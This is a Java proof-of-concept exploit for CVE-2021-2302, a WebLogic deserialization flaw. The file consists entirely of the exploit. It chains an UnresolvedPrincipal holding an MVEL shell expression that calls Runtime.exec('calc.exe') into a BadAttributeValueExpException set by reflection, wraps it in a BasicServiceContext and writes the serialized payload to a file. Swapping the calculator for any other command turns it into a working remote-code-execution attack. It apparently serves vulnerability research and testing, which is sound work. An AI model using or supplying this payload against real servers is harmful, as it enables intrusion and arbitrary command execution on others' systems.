import oracle.security.jps.az.internal.common.principals.UnresolvedPrincipal;
import weblogic.rmi.provider.BasicServiceContext;

import javax.management.BadAttributeValueExpException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class PoC_CVE_2021_2302 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
        UnresolvedPrincipal unresolvedPrincipal = new UnresolvedPrincipal("com.tangosol.coherence.mvel2.sh.ShellSession","java.lang.Runtime.getRuntime().exec('calc.exe');");

        BadAttributeValueExpException badAttribute = new BadAttributeValueExpException(null);
        Field f2 = badAttribute.getClass().getDeclaredField("val");
        f2.setAccessible(true);
        f2.set(badAttribute, unresolvedPrincipal );

        BasicServiceContext basicServiceContext = new BasicServiceContext(1, badAttribute, false);

        FileOutputStream fos = new FileOutputStream("PoC_CVE_2021_2302.ser");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fos);
        objectOutputStream.writeObject(basicServiceContext);
        objectOutputStream.close();


    }
}
